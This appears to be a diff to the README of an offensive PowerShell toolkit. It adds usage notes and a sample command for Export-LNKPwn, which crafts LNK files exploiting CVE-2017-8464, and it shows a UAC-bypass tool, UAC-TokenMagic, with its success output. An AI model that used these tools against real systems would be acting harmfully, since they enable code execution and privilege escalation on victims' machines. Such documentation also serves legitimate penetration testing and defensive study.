@@ -280,6 +280,18 @@ C:\PS> $CallResult
 False
 ```
 
+## pwnd
+
+### Export-LNKPwn
+
+Create LNK files to exploit CVE-2017-8464 aka LNK round 3 ;))!
+
+Currently, it is recommended that you create the lnk locally and then move it to the target system because of .Net and PowerShell dependencies. Please refer to the function synopsis for further details.
+
+```
+C:\PS> Export-LNKPwn -LNKOutPath C:\Some\Local\Path.lnk -TargetCPLPath C:\Target\CPL\Path.cpl -Type SpecialFolderDataBlock
+```
+
 ### UAC-TokenMagic
 
 Based on James Forshaw's three part post on UAC, linked below, and possibly a technique used by the CIA!
@@ -305,8 +317,6 @@ C:\PS> UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c calc.exe" -
 [*] Successfully impersonated security context
 [*] Magic..
 ```
-
-## pwnd
 
 ### Bypass-UAC
 
